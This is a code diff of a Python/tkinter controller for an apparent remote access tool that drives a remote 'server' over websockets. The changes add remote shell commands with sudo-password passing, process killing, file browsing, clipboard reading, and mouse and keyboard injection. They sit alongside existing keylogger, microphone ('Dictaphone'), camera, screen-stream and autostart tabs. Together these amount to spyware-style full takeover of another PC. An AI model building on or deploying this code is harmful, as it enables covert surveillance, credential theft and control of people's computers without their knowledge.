@@ -132,9 +132,11 @@ class Device:
         uri = "ws://" + self.host + ":" + str(self.port)
 
         async def main():
+            ws = None
             try:
                 ws = await websockets.connect(
-                    uri, ping_interval=30, ping_timeout=10)
+                    uri, ping_interval=30, ping_timeout=10,
+                    close_timeout=2)
                 self.ws = ws
                 await self._auth()
                 self.msg_queue.put({"type": "connected"})
@@ -143,12 +145,22 @@ class Device:
                 self.msg_queue.put({"type": "disconnected"})
             except websockets.exceptions.InvalidStatus:
                 self.msg_queue.put({"type": "disconnected"})
+            except websockets.exceptions.ConnectionClosedError:
+                self.msg_queue.put({"type": "disconnected"})
+            except OSError:
+                self.msg_queue.put({"type": "disconnected"})
             except Exception as e:
                 log.exception("Connection error: %s", e)
                 self.msg_queue.put({"type": "disconnected"})
             finally:
                 self.running = False
                 self.connected = False
+                if ws:
+                    try:
+                        await ws.close()
+                    except Exception:
+                        pass
+                self.ws = None
                 self.msg_queue.put({"type": "disconnected"})
 
         self.loop.run_until_complete(main())
@@ -213,19 +225,35 @@ class Device:
                 r = self.msg_queue.get(timeout=0.5)
                 if r["type"] == resp_type:
                     return r
+                else:
+                    self.msg_queue.put(r)
+                    time.sleep(0.02)
             except queue.Empty:
                 continue
         return None
 
     def close_ws(self):
         """Safely close websocket connection."""
-        if self.ws and self.loop and self.loop.is_running():
-            def _close():
-                asyncio.run_coroutine_threadsafe(self.ws.close(), self.loop)
-            threading.Thread(target=_close, daemon=True).start()
-        self.ws = None
-        self.connected = False
         self.running = False
+        self.connected = False
+        if self.ws:
+            try:
+                if self.loop and not self.loop.is_closed():
+                    asyncio.run_coroutine_threadsafe(self.ws.close(), self.loop)
+                else:
+                    try:
+                        import threading as _th
+                        _th.Thread(target=lambda: self.loop.run_until_complete(self.ws.close()) if self.loop and not self.loop.is_closed() else None, daemon=True).start()
+                    except Exception:
+                        pass
+            except Exception:
+                pass
+        self.ws = None
+        while not self.msg_queue.empty():
+            try:
+                self.msg_queue.get_nowait()
+            except queue.Empty:
+                break
 
     def ping(self):
         self._send("ping")
@@ -235,6 +263,9 @@ class Device:
                 r = self.msg_queue.get(timeout=0.5)
                 if r["type"] == "pong":
                     return (time.monotonic() - t0) * 1000
+                else:
+                    self.msg_queue.put(r)
+                    time.sleep(0.02)
             except queue.Empty:
                 continue
         return None
@@ -244,8 +275,11 @@ class Device:
         r = self._wait_resp("screenshot_data", timeout=20)
         return r["data"] if r else None
 
-    def exec_cmd(self, command, timeout=60):
-        self._send("exec", {"command": command, "timeout": timeout})
+    def exec_cmd(self, command, timeout=60, sudo_password=None):
+        payload = {"command": command, "timeout": timeout}
+        if sudo_password:
+            payload["sudo_password"] = sudo_password
+        self._send("exec", payload)
         r = self._wait_resp("exec_result", timeout=float(timeout) + 10)
         return r["data"] if r else {"stdout": "", "stderr": "Timeout", "returncode": -1}
 
@@ -266,6 +300,9 @@ class Device:
                     text = r["data"].get("stdout", "") + r["data"].get("stderr", "")
                     if text:
                         out.append(text)
+                else:
+                    self.msg_queue.put(r)
+                    time.sleep(0.02)
             except queue.Empty:
                 break
         return "".join(out)
@@ -450,8 +487,89 @@ class Device:
 
     def restart_server(self):
         self._send("server_restart")
-        r = self._wait_resp("server_restart_ack", timeout=30)
+        r = self._wait_resp("server_restart_ack", timeout=15)
+        if r:
+            self.connected = False
+            self.running = False
         return r is not None
+
+    def sysinfo(self):
+        self._send("sysinfo")
+        r = self._wait_resp("sysinfo", timeout=15)
+        return r["data"] if r else {}
+
+    def process_list(self):
+        self._send("process_list")
+        r = self._wait_resp("process_list", timeout=15)
+        return r["data"].get("processes", []) if r else []
+
+    def process_kill(self, pid=None, name=None):
+        self._send("process_kill", {"pid": pid, "name": name})
+        r = self._wait_resp("process_kill_result", timeout=10)
+        return r["data"] if r else {"success": False, "message": "No response"}
+
+    def fs_list(self, path="."):
+        self._send("fs_list", {"path": path})
+        r = self._wait_resp("fs_list", timeout=10)
+        return r["data"] if r else {"error": "No response"}
+
+    def clipboard_get(self):
+        self._send("clipboard_get")
+        r = self._wait_resp("clipboard_result", timeout=10)
+        return r["data"] if r else {"success": False, "text": "No response"}
+
+    def clipboard_set(self, text):
+        self._send("clipboard_set", {"text": text})
+        r = self._wait_resp("clipboard_result", timeout=10)
+        return r["data"] if r else {"success": False, "text": "No response"}
+
+    def heartbeat(self):
+        self._send("heartbeat")
+        r = self._wait_resp("heartbeat", timeout=10)
+        return r["data"] if r else {}
+
+    def uninstall(self):
+        self._send("uninstall")
+        r = self._wait_resp("uninstall_result", timeout=15)
+        return r["data"] if r else {"success": False, "message": "No response"}
+
+    def update_github(self):
+        self._send("update")
+        return True
+
+    def mouse_move(self, x, y, relative=False):
+        self._send("mouse_move", {"x": x, "y": y, "relative": relative})
+        r = self._wait_resp("mouse_result", timeout=5)
+        return r["data"] if r else {"success": False, "message": "No response"}
+
+    def mouse_click(self, x=None, y=None, button="left", clicks=1):
+        p = {"button": button, "clicks": clicks}
+        if x is not None:
+            p["x"] = x
+            p["y"] = y
+        self._send("mouse_click", p)
+        r = self._wait_resp("mouse_result", timeout=5)
+        return r["data"] if r else {"success": False, "message": "No response"}
+
+    def mouse_scroll(self, dx=0, dy=0):
+        self._send("mouse_scroll", {"dx": dx, "dy": dy})
+        r = self._wait_resp("mouse_result", timeout=5)
+        return r["data"] if r else {"success": False, "message": "No response"}
+
+    def keyboard_type(self, text):
+        self._send("keyboard_type", {"text": text})
+        r = self._wait_resp("keyboard_result", timeout=10)
+        return r["data"] if r else {"success": False, "message": "No response"}
+
+    def keyboard_hotkey(self, keys):
+        self._send("keyboard_hotkey", {"keys": keys})
+        r = self._wait_resp("keyboard_result", timeout=5)
+        return r["data"] if r else {"success": False, "message": "No response"}
+
+    def keyboard_press(self, key):
+        self._send("keyboard_press", {"key": key})
+        r = self._wait_resp("keyboard_result", timeout=5)
+        return r["data"] if r else {"success": False, "message": "No response"}
 
 
 # =========================================================================
@@ -575,7 +693,7 @@ class UpdateDialog:
     def __init__(self, parent, device):
         self.win = tk.Toplevel(parent)
         self.win.title("Update: " + device.name)
-        self.win.geometry("500x380")
+        self.win.geometry("500x480")
         self.win.configure(bg=C_SURFACE)
         self.win.resizable(False, False)
         self.win.transient(parent)
@@ -628,6 +746,17 @@ class UpdateDialog:
         self.apply_btn = mbtn(zrow, "Upload & Apply", self._apply, width=16)
         self.apply_btn.pack(side="left", padx=4)
         self.apply_btn.configure(state="disabled")
+
+        # ── Section 4: GitHub Auto Update ──
+        f4 = tk.LabelFrame(self.win, text="GitHub Auto Update", bg=C_SURFACE, fg=C_FG,
+                           font=("Segoe UI", 10, "bold"))
+        f4.pack(fill="x", padx=20, pady=(4, 4), ipady=8)
+
+        tk.Label(f4, text="Download latest version from GitHub and restart server",
+                 bg=C_SURFACE, fg=C_FG_DIM, font=("Segoe UI", 9)).pack(pady=(2, 4))
+
+        self.github_btn = mbtn(f4, "🔄 Update from GitHub", self._github_update, width=20)
+        self.github_btn.pack(pady=2)
 
         # ── Status ──
         self.status_var = tk.StringVar(value="")
@@ -725,6 +854,50 @@ class UpdateDialog:
             self.win.after(0, lambda: self.status_var.set("Sent, server restarting..."))
             self.win.after(0, lambda: self.apply_btn.configure(state="normal"))
             threading.Thread(target=self._wait_reconn, daemon=True).start()
+
+    def _github_update(self):
+        if not self.dev or not self.dev.connected:
+            messagebox.showerror("Error", "Device not connected")
+            return
+        if not messagebox.askyesno("GitHub Update",
+                "Update from GitHub (Pryanik-M/GoodScript)?\nServer will restart after update."):
+            return
+        self.github_btn.configure(state="disabled")
+        self.status_var.set("Sending update command...")
+        threading.Thread(target=self._do_github_update, daemon=True).start()
+
+    def _do_github_update(self):
+        try:
+            self.dev.update_github()
+            self.win.after(0, lambda: self.status_var.set("Update command sent. Monitoring status..."))
+            t0 = time.monotonic()
+            while time.monotonic() - t0 < 120:
+                try:
+                    r = self.dev.msg_queue.get(timeout=1)
+                    if r["type"] == "update_status":
+                        status = r["data"].get("status", "")
+                        message = r["data"].get("message", "")
+                        self.win.after(0, lambda s=status, m=message: self.status_var.set(
+                            {"starting": "🔄 " + m, "downloading": "📥 " + m,
+                             "extracting": "📦 " + m, "installing": "⚙️ " + m,
+                             "restarting": "🔃 " + m, "error": "❌ " + m}.get(s, m)))
+                        if status == "restarting":
+                            self.win.after(0, lambda: self.status_var.set("🔃 Server restarting..."))
+                            threading.Thread(target=self._wait_reconn, daemon=True).start()
+                            return
+                        if status == "error":
+                            self.win.after(0, lambda: self.github_btn.configure(state="normal"))
+                            return
+                    else:
+                        self.dev.msg_queue.put(r)
+                        time.sleep(0.02)
+                except queue.Empty:
+                    continue
+            self.win.after(0, lambda: self.status_var.set("Timeout waiting for update"))
+            self.win.after(0, lambda: self.github_btn.configure(state="normal"))
+        except Exception as e:
+            self.win.after(0, lambda: self.status_var.set("Error: " + str(e)))
+            self.win.after(0, lambda: self.github_btn.configure(state="normal"))
 
     def _wait_reconn(self):
         time.sleep(20)
@@ -879,6 +1052,17 @@ class App:
             self.stream_active = False
             self.screen_active = False
             return
+        self.dev.close_ws()
+        while not self.dev.msg_queue.empty():
+            try:
+                self.dev.msg_queue.get_nowait()
+            except queue.Empty:
+                break
+        if self.dev.loop and not self.dev.loop.is_closed():
+            try:
+                self.dev.loop.call_soon_threadsafe(self.dev.loop.stop)
+            except Exception:
+                pass
         self.dev.connect_async()
         self._status("Connecting...", C_ORANGE)
         threading.Thread(target=self._wait_conn, daemon=True).start()
@@ -914,7 +1098,7 @@ class App:
         nb.pack(fill="both", expand=True, padx=5, pady=5)
 
         self.tabs = {}
-        for name in ["Screenshot", "ScreenStream", "Camera", "Commands", "Shell", "Files", "Dictaphone", "Keylog", "System"]:
+        for name in ["Screenshot", "ScreenStream", "Camera", "Commands", "Shell", "Files", "Input", "Dictaphone", "Keylog", "System"]:
             frm = tk.Frame(nb, bg=C_SURFACE)
             nb.add(frm, text=name)
             self.tabs[name] = frm
@@ -925,6 +1109,7 @@ class App:
         self._tab_cmd()
         self._tab_shell()
         self._tab_files()
+        self._tab_input()
         self._tab_dict()
         self._tab_keylog()
         self._tab_sys()
@@ -1073,6 +1258,9 @@ class App:
         self.cmd_e.pack(side="left", fill="x", expand=True, padx=4)
         self.cmd_e.bind("<Return>", lambda e: self._on_exec())
         mbtn(top, "Run", self._on_exec).pack(side="left")
+        mlabel(top, " Sudo:").pack(side="left", padx=(8, 2))
+        self.sudo_pw_e = ttk.Entry(top, width=14, show="*")
+        self.sudo_pw_e.pack(side="left", padx=2)
         self.cmd_out = mbox(tab, height=20)
         self.cmd_out.pack(fill="both", expand=True, padx=15, pady=8)
 
@@ -1080,13 +1268,16 @@ class App:
         if not self._check_conn(): return
         cmd = self.cmd_e.get().strip()
         if not cmd: return
-        threading.Thread(target=self._do_exec, args=(cmd,), daemon=True).start()
+        sudo_pw = self.sudo_pw_e.get().strip() or None
+        threading.Thread(target=self._do_exec, args=(cmd, sudo_pw), daemon=True).start()
 
-    def _do_exec(self, cmd):
-        r = self.dev.exec_cmd(cmd)
+    def _do_exec(self, cmd, sudo_password=None):
+        r = self.dev.exec_cmd(cmd, sudo_password=sudo_password)
         out = "$ " + cmd + "\n" + r.get("stdout", "")
         if r.get("stderr"):
             out += "\n[STDERR]\n" + r["stderr"]
+        if r.get("needs_sudo_password"):
+            out += "\n⚠ SUDO requires password — enter it in 'Sudo' field and re-run"
         out += "\n[Exit: " + str(r.get("returncode", "?")) + "]\n" + "-" * 60 + "\n"
         self.root.after(0, lambda: mappend(self.cmd_out, out))
 
@@ -1187,6 +1378,178 @@ class App:
     def _do_recv_bg(self, rp, lp):
         ok, msg = self.dev.recv_file(rp, lp)
         self.root.after(0, lambda: self._log_file(msg))
+
+    # ──── Input (Mouse + Keyboard) ────
+    def _tab_input(self):
+        tab = self.tabs["Input"]
+
+        nb = ttk.Notebook(tab)
+        nb.pack(fill="both", expand=True, padx=5, pady=5)
+
+        mouse_tab = tk.Frame(nb, bg=C_SURFACE)
+        kb_tab = tk.Frame(nb, bg=C_SURFACE)
+        nb.add(mouse_tab, text="Mouse")
+        nb.add(kb_tab, text="Keyboard")
+
+        self._build_mouse_tab(mouse_tab)
+        self._build_kb_tab(kb_tab)
+
+    def _build_mouse_tab(self, tab):
+        ctrl = tk.Frame(tab, bg=C_SURFACE)
+        ctrl.pack(fill="x", padx=10, pady=6)
+
+        mlabel(ctrl, "X:").pack(side="left", padx=2)
+        self.mouse_x = ttk.Entry(ctrl, width=6)
+        self.mouse_x.insert(0, "500")
+        self.mouse_x.pack(side="left", padx=2)
+
+        mlabel(ctrl, "Y:").pack(side="left", padx=2)
+        self.mouse_y = ttk.Entry(ctrl, width=6)
+        self.mouse_y.insert(0, "300")
+        self.mouse_y.pack(side="left", padx=2)
+
+        mbtn(ctrl, "Move", self._on_mouse_move).pack(side="left", padx=4)
+        mbtn(ctrl, "Move Relative", self._on_mouse_move_rel).pack(side="left", padx=4)
+
+        ctrl2 = tk.Frame(tab, bg=C_SURFACE)
+        ctrl2.pack(fill="x", padx=10, pady=6)
+
+        mlabel(ctrl2, "Button:").pack(side="left", padx=2)
+        self.mouse_btn = ttk.Combobox(ctrl2, values=["left", "right", "middle"], width=8, state="readonly")
+        self.mouse_btn.set("left")
+        self.mouse_btn.pack(side="left", padx=2)
+
+        mlabel(ctrl2, "Clicks:").pack(side="left", padx=2)
+        self.mouse_clicks = ttk.Entry(ctrl2, width=4)
+        self.mouse_clicks.insert(0, "1")
+        self.mouse_clicks.pack(side="left", padx=2)
+
+        mbtn(ctrl2, "Click", self._on_mouse_click).pack(side="left", padx=4)
+
+        ctrl3 = tk.Frame(tab, bg=C_SURFACE)
+        ctrl3.pack(fill="x", padx=10, pady=6)
+
+        mlabel(ctrl3, "Scroll Y:").pack(side="left", padx=2)
+        self.scroll_dy = ttk.Entry(ctrl3, width=5)
+        self.scroll_dy.insert(0, "3")
+        self.scroll_dy.pack(side="left", padx=2)
+
+        mbtn(ctrl3, "Scroll", self._on_mouse_scroll).pack(side="left", padx=4)
+
+        self.mouse_log = mbox(tab, height=10)
+        self.mouse_log.pack(fill="both", expand=True, padx=10, pady=4)
+
+    def _on_mouse_move(self):
+        if not self._check_conn(): return
+        try:
+            x = int(self.mouse_x.get())
+            y = int(self.mouse_y.get())
+        except ValueError:
+            return
+        threading.Thread(target=lambda: self.dev.mouse_move(x, y), daemon=True).start()
+
+    def _on_mouse_move_rel(self):
+        if not self._check_conn(): return
+        try:
+            x = int(self.mouse_x.get())
+            y = int(self.mouse_y.get())
+        except ValueError:
+            return
+        threading.Thread(target=lambda: self.dev.mouse_move(x, y, relative=True), daemon=True).start()
+
+    def _on_mouse_click(self):
+        if not self._check_conn(): return
+        try:
+            x = int(self.mouse_x.get())
+            y = int(self.mouse_y.get())
+        except ValueError:
+            x = y = None
+        btn = self.mouse_btn.get()
+        try:
+            clicks = int(self.mouse_clicks.get())
+        except ValueError:
+            clicks = 1
+        threading.Thread(target=lambda: self.dev.mouse_click(x, y, btn, clicks), daemon=True).start()
+
+    def _on_mouse_scroll(self):
+        if not self._check_conn(): return
+        try:
+            dy = int(self.scroll_dy.get())
+        except ValueError:
+            dy = 3
+        threading.Thread(target=lambda: self.dev.mouse_scroll(dy=dy), daemon=True).start()
+
+    def _build_kb_tab(self, tab):
+        ctrl = tk.Frame(tab, bg=C_SURFACE)
+        ctrl.pack(fill="x", padx=10, pady=6)
+
+        mlabel(ctrl, "Text:").pack(side="left", padx=2)
+        self.kb_text = ttk.Entry(ctrl, width=40)
+        self.kb_text.pack(side="left", padx=2)
+        mbtn(ctrl, "Type", self._on_kb_type).pack(side="left", padx=4)
+
+        ctrl2 = tk.Frame(tab, bg=C_SURFACE)
+        ctrl2.pack(fill="x", padx=10, pady=6)
+
+        mlabel(ctrl2, "Hotkey:").pack(side="left", padx=2)
+        self.kb_hotkey = ttk.Entry(ctrl2, width=20)
+        self.kb_hotkey.insert(0, "ctrl+c")
+        self.kb_hotkey.pack(side="left", padx=2)
+        mbtn(ctrl2, "Send", self._on_kb_hotkey).pack(side="left", padx=4)
+
+        ctrl3 = tk.Frame(tab, bg=C_SURFACE)
+        ctrl3.pack(fill="x", padx=10, pady=6)
+
+        mlabel(ctrl3, "Key:").pack(side="left", padx=2)
+        self.kb_key = ttk.Entry(ctrl3, width=15)
+        self.kb_key.insert(0, "enter")
+        self.kb_key.pack(side="left", padx=2)
+        mbtn(ctrl3, "Press", self._on_kb_press).pack(side="left", padx=4)
+
+        quick = tk.Frame(tab, bg=C_SURFACE)
+        quick.pack(fill="x", padx=10, pady=4)
+        for label, key in [("Enter", "enter"), ("Tab", "tab"), ("Esc", "escape"),
+                           ("Win", "win"), ("Alt+F4", None), ("Ctrl+A", None),
+                           ("Ctrl+C", None), ("Ctrl+V", None), ("Win+R", None)]:
+            if key:
+                mbtn(quick, label, lambda k=key: self._quick_press(k), width=8).pack(side="left", padx=2)
+            else:
+                keys_map = {"Alt+F4": ["alt", "f4"], "Ctrl+A": ["ctrl", "a"],
+                            "Ctrl+C": ["ctrl", "c"], "Ctrl+V": ["ctrl", "v"],
+                            "Win+R": ["win", "r"]}
+                k = keys_map.get(label)
+                if k:
+                    mbtn(quick, label, lambda ks=k: self._quick_hotkey(ks), width=8).pack(side="left", padx=2)
+
+        self.kb_log = mbox(tab, height=12)
+        self.kb_log.pack(fill="both", expand=True, padx=10, pady=4)
+
+    def _on_kb_type(self):
+        if not self._check_conn(): return
+        text = self.kb_text.get()
+        if not text: return
+        threading.Thread(target=lambda: self.dev.keyboard_type(text), daemon=True).start()
+
+    def _on_kb_hotkey(self):
+        if not self._check_conn(): return
+        hk = self.kb_hotkey.get().strip()
+        if not hk: return
+        keys = hk.split("+")
+        threading.Thread(target=lambda: self.dev.keyboard_hotkey(keys), daemon=True).start()
+
+    def _on_kb_press(self):
+        if not self._check_conn(): return
+        key = self.kb_key.get().strip()
+        if not key: return
+        threading.Thread(target=lambda: self.dev.keyboard_press(key), daemon=True).start()
+
+    def _quick_press(self, key):
+        if not self._check_conn(): return
+        threading.Thread(target=lambda: self.dev.keyboard_press(key), daemon=True).start()
+
+    def _quick_hotkey(self, keys):
+        if not self._check_conn(): return
+        threading.Thread(target=lambda: self.dev.keyboard_hotkey(keys), daemon=True).start()
 
     # ──── Dictaphone ────
     def _tab_dict(self):
@@ -1437,11 +1800,197 @@ class App:
     # System
     def _tab_sys(self):
         tab = self.tabs["System"]
-        mlabel(tab, "Server Info:", font=("Segoe UI", 10, "bold")).pack(anchor="w", padx=15, pady=(8, 4))
-        self.srv_info = mbox(tab, height=8)
-        self.srv_info.pack(fill="x", padx=15, pady=4)
-        mbtn(tab, "Refresh", self._on_srv_info).pack(pady=4)
 
+        nb = ttk.Notebook(tab)
+        nb.pack(fill="both", expand=True, padx=5, pady=5)
+
+        info_tab = tk.Frame(nb, bg=C_SURFACE)
+        proc_tab = tk.Frame(nb, bg=C_SURFACE)
+        fs_tab = tk.Frame(nb, bg=C_SURFACE)
+        clip_tab = tk.Frame(nb, bg=C_SURFACE)
+        manage_tab = tk.Frame(nb, bg=C_SURFACE)
+
+        nb.add(info_tab, text="Info")
+        nb.add(proc_tab, text="Processes")
+        nb.add(fs_tab, text="Files")
+        nb.add(clip_tab, text="Clipboard")
+        nb.add(manage_tab, text="Manage")
+
+        self._build_sys_info(info_tab)
+        self._build_sys_proc(proc_tab)
+        self._build_sys_fs(fs_tab)
+        self._build_sys_clip(clip_tab)
+        self._build_sys_manage(manage_tab)
+
+    def _build_sys_info(self, tab):
+        ctrl = tk.Frame(tab, bg=C_SURFACE)
+        ctrl.pack(fill="x", padx=10, pady=6)
+        mbtn(ctrl, "Refresh", self._on_sysinfo).pack(side="left", padx=4)
+        self.sysinfo_box = mbox(tab, height=20)
+        self.sysinfo_box.pack(fill="both", expand=True, padx=10, pady=4)
+
+    def _on_sysinfo(self):
+        if not self._check_conn(): return
+        threading.Thread(target=self._do_sysinfo, daemon=True).start()
+
+    def _do_sysinfo(self):
+        info = self.dev.sysinfo()
+        if not info:
+            self.root.after(0, lambda: mappend(self.sysinfo_box, "No response\n"))
+            return
+        lines = ["=== System Info ==="]
+        for k, v in info.items():
+            if k == "ip":
+                continue
+            lines.append(f"  {k}: {v}")
+        self.root.after(0, lambda: (mclear(self.sysinfo_box), mappend(self.sysinfo_box, "\n".join(lines))))
+
+    def _build_sys_proc(self, tab):
+        ctrl = tk.Frame(tab, bg=C_SURFACE)
+        ctrl.pack(fill="x", padx=10, pady=6)
+        mbtn(ctrl, "Refresh", self._on_proc_refresh).pack(side="left", padx=4)
+        mlabel(ctrl, "Kill:").pack(side="left", padx=(8, 2))
+        self.kill_e = ttk.Entry(ctrl, width=12)
+        self.kill_e.pack(side="left", padx=2)
+        mbtn(ctrl, "Kill", self._on_proc_kill).pack(side="left", padx=4)
+
+        cols = ("pid", "name", "cpu", "mem", "status")
+        self.proc_tree = ttk.Treeview(tab, columns=cols, show="headings", height=20)
+        self.proc_tree.heading("pid", text="PID")
+        self.proc_tree.heading("name", text="Name")
+        self.proc_tree.heading("cpu", text="CPU%")
+        self.proc_tree.heading("mem", text="MEM%")
+        self.proc_tree.heading("status", text="Status")
+        self.proc_tree.column("pid", width=70)
+        self.proc_tree.column("name", width=200)
+        self.proc_tree.column("cpu", width=60)
+        self.proc_tree.column("mem", width=60)
+        self.proc_tree.column("status", width=80)
+        self.proc_tree.pack(fill="both", expand=True, padx=10, pady=4)
+
+    def _on_proc_refresh(self):
+        if not self._check_conn(): return
+        threading.Thread(target=self._do_proc_refresh, daemon=True).start()
+
+    def _do_proc_refresh(self):
+        procs = self.dev.process_list()
+        for i in self.proc_tree.get_children():
+            self.proc_tree.delete(i)
+        for p in procs[:100]:
+            self.proc_tree.insert("", "end", values=(
+                p.get("pid", ""), p.get("name", ""),
+                f"{p.get('cpu', 0):.1f}", f"{p.get('mem', 0):.1f}",
+                p.get("status", ""),
+            ))
+
+    def _on_proc_kill(self):
+        if not self._check_conn(): return
+        target = self.kill_e.get().strip()
+        if not target: return
+        threading.Thread(target=self._do_proc_kill, args=(target,), daemon=True).start()
+
+    def _do_proc_kill(self, target):
+        if target.isdigit():
+            r = self.dev.process_kill(pid=int(target))
+        else:
+            r = self.dev.process_kill(name=target)
+        self.root.after(0, lambda: messagebox.showinfo("Kill", r.get("message", "?")))
+
+    def _build_sys_fs(self, tab):
+        ctrl = tk.Frame(tab, bg=C_SURFACE)
+        ctrl.pack(fill="x", padx=10, pady=6)
+        mlabel(ctrl, "Path:").pack(side="left", padx=2)
+        self.fs_path_e = ttk.Entry(ctrl, width=50)
+        self.fs_path_e.insert(0, "C:\\")
+        self.fs_path_e.pack(side="left", padx=4)
+        mbtn(ctrl, "Browse", self._on_fs_browse).pack(side="left", padx=4)
+
+        cols = ("name", "type", "size")
+        self.fs_tree = ttk.Treeview(tab, columns=cols, show="headings", height=20)
+        self.fs_tree.heading("name", text="Name")
+        self.fs_tree.heading("type", text="Type")
+        self.fs_tree.heading("size", text="Size")
+        self.fs_tree.column("name", width=350)
+        self.fs_tree.column("type", width=60)
+        self.fs_tree.column("size", width=100)
+        self.fs_tree.pack(fill="both", expand=True, padx=10, pady=4)
+        self.fs_tree.bind("<Double-1>", self._on_fs_dblclick)
+
+    def _on_fs_browse(self):
+        if not self._check_conn(): return
+        path = self.fs_path_e.get().strip() or "."
+        threading.Thread(target=self._do_fs_browse, args=(path,), daemon=True).start()
+
+    def _do_fs_browse(self, path):
+        result = self.dev.fs_list(path)
+        if "error" in result:
+            self.root.after(0, lambda: messagebox.showerror("Error", result["error"]))
+            return
+        self.fs_path_e.delete(0, "end")
+        self.fs_path_e.insert(0, result.get("path", path))
+        for i in self.fs_tree.get_children():
+            self.fs_tree.delete(i)
+        for e in result.get("entries", []):
+            sz = e.get("size", 0)
+            if sz > 1024*1024:
+                sz_s = f"{sz/(1024*1024):.1f} MB"
+            elif sz > 1024:
+                sz_s = f"{sz/1024:.1f} KB"
+            else:
+                sz_s = f"{sz} B"
+            self.fs_tree.insert("", "end", values=(
+                e.get("name", ""), "DIR" if e.get("is_dir") else "FILE", sz_s
+            ))
+
+    def _on_fs_dblclick(self, event):
+        sel = self.fs_tree.selection()
+        if not sel: return
+        item = self.fs_tree.item(sel[0])
+        name = item["values"][0]
+        is_dir = item["values"][1] == "DIR"
+        if is_dir:
+            current = self.fs_path_e.get().strip()
+            if current and not current.endswith("\\"):
+                current += "\\"
+            self.fs_path_e.delete(0, "end")
+            self.fs_path_e.insert(0, current + name)
+            self._on_fs_browse()
+
+    def _build_sys_clip(self, tab):
+        ctrl = tk.Frame(tab, bg=C_SURFACE)
+        ctrl.pack(fill="x", padx=10, pady=6)
+        mbtn(ctrl, "Get Clipboard", self._on_clip_get).pack(side="left", padx=4)
+        mlabel(ctrl, "Set:").pack(side="left", padx=(8, 2))
+        self.clip_e = ttk.Entry(ctrl, width=40)
+        self.clip_e.pack(side="left", padx=2)
+        mbtn(ctrl, "Set Clipboard", self._on_clip_set).pack(side="left", padx=4)
+        self.clip_box = mbox(tab, height=20)
+        self.clip_box.pack(fill="both", expand=True, padx=10, pady=4)
+
+    def _on_clip_get(self):
+        if not self._check_conn(): return
+        threading.Thread(target=self._do_clip_get, daemon=True).start()
+
+    def _do_clip_get(self):
+        r = self.dev.clipboard_get()
+        if r.get("success"):
+            txt = r.get("text", "")
+            self.root.after(0, lambda: (mclear(self.clip_box), mappend(self.clip_box, txt)))
+        else:
+            self.root.after(0, lambda: mappend(self.clip_box, "Error: " + r.get("text", "")))
+
+    def _on_clip_set(self):
+        if not self._check_conn(): return
+        text = self.clip_e.get().strip()
+        if not text: return
+        threading.Thread(target=self._do_clip_set, args=(text,), daemon=True).start()
+
+    def _do_clip_set(self, text):
+        r = self.dev.clipboard_set(text)
+        ok = r.get("success", False)
+        self.root.after(0, lambda: mappend(self.clip_box, f"{'OK' if ok else 'FAIL'}: {r.get('text', '')}\n"))
+
+    def _build_sys_manage(self, tab):
         mlabel(tab, "Autostart:", font=("Segoe UI", 10, "bold")).pack(anchor="w", padx=15, pady=(8, 4))
         af = tk.Frame(tab, bg=C_SURFACE)
         af.pack(fill="x", padx=15, pady=4)
@@ -1450,7 +1999,11 @@ class App:
         self.auto_st = mlabel(af, "[not installed]", fg=C_FG_DIM)
         self.auto_st.pack(side="left", padx=10)
 
-        mbtn(tab, "Restart Server", self._on_restart).pack(pady=6)
+        mlabel(tab, "Server Control:", font=("Segoe UI", 10, "bold")).pack(anchor="w", padx=15, pady=(8, 4))
+        sc = tk.Frame(tab, bg=C_SURFACE)
+        sc.pack(fill="x", padx=15, pady=4)
+        mbtn(sc, "Restart Server", self._on_restart).pack(side="left", padx=4)
+        mbtn(sc, "Heartbeat", self._on_heartbeat).pack(side="left", padx=4)
 
         mlabel(tab, "Server Logs:", font=("Segoe UI", 10, "bold")).pack(anchor="w", padx=15, pady=(8, 4))
         log_btns = tk.Frame(tab, bg=C_SURFACE)
@@ -1461,26 +2014,44 @@ class App:
         self.log_status = mlabel(log_btns, "", fg=C_FG_DIM)
         self.log_status.pack(side="left", padx=10)
 
-        self.upd_log = mbox(tab, height=10)
+        mlabel(tab, "Danger Zone:", font=("Segoe UI", 10, "bold")).pack(anchor="w", padx=15, pady=(12, 4))
+        dz = tk.Frame(tab, bg=C_SURFACE)
+        dz.pack(fill="x", padx=15, pady=4)
+        mbtn(dz, "UNINSTALL Server", self._on_uninstall).pack(side="left", padx=4)
+
+        self.upd_log = mbox(tab, height=8)
         self.upd_log.pack(fill="x", padx=15, pady=6)
+
+    def _on_heartbeat(self):
+        if not self._check_conn(): return
+        threading.Thread(target=self._do_heartbeat, daemon=True).start()
+
+    def _do_heartbeat(self):
+        info = self.dev.heartbeat()
+        if info:
+            lines = ["=== Heartbeat ==="]
+            for k, v in info.items():
+                if k == "ip":
+                    continue
+                lines.append(f"  {k}: {v}")
+            self.root.after(0, lambda: (mclear(self.upd_log), mappend(self.upd_log, "\n".join(lines))))
+        else:
+            self.root.after(0, lambda: mappend(self.upd_log, "No response\n"))
+
+    def _on_uninstall(self):
+        if not self._check_conn(): return
+        if not messagebox.askyesno("DANGER", "This will completely remove the server from the remote PC. Continue?"):
+            return
+        threading.Thread(target=self._do_uninstall, daemon=True).start()
+
+    def _do_uninstall(self):
+        r = self.dev.uninstall()
+        msg = r.get("message", "Unknown") if r else "No response"
+        self.root.after(0, lambda: messagebox.showinfo("Uninstall", msg))
 
     def _log_sys(self, msg):
         if hasattr(self, "upd_log"):
             mappend(self.upd_log, "[" + time.strftime("%H:%M:%S") + "] " + msg)
-
-    def _on_srv_info(self):
-        if not self._check_conn(): return
-        threading.Thread(target=self._do_srv_info, daemon=True).start()
-
-    def _do_srv_info(self):
-        cmd = "systeminfo" if platform.system() == "Windows" else "uname -a"
-        r = self.dev.exec_cmd(cmd, timeout=30)
-        info = "=== Server (" + time.strftime("%Y-%m-%d %H:%M") + ") ===\n" + r.get("stdout", "N/A")
-        self.root.after(0, lambda: self._show_srv_info(info))
-
-    def _show_srv_info(self, info):
-        mclear(self.srv_info)
-        mappend(self.srv_info, info)
 
     def _on_install_auto(self):
         if not self._check_conn(): return
@@ -1509,9 +2080,33 @@ class App:
 
     def _on_restart(self):
         if not self._check_conn(): return
-        if not messagebox.askyesno("Confirm", "Restart " + self.dev.name + "?"): return
+        if not messagebox.askyesno("Confirm", "Restart " + self.dev.name + "?\nServer will restart and you'll need to reconnect."): return
         self.dev.restart_server()
-        messagebox.showinfo("Restart", "Sent restart command to " + self.dev.name)
+        self._status("Restarting...", C_ORANGE)
+        self._shell_is_active = False
+        self.stream_active = False
+        self.screen_active = False
+        self.dev.connected = False
+        self.dev.running = False
